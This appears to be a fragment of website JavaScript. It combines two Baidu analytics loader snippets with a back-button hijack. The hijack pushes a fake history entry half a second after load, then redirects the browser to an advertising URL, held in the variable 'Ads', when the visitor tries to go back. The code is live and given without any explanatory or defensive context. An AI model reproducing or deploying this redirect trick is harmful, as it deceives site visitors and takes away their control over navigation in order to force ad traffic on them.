window.onhashchange = function() {
            jp();
        };

        function hh1() {
            history.pushState(history.length + 1, "message", "#" + new Date().getTime());
        }

        function jp() {
            fh();
        }
        setTimeout('hh1();', 500);

        function fh() {
            location.href = Ads;
        }
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?0456f0aafc5d973f921f76b8e8be36da";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?3b544194d661a045ef4b8172ff17fb55";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();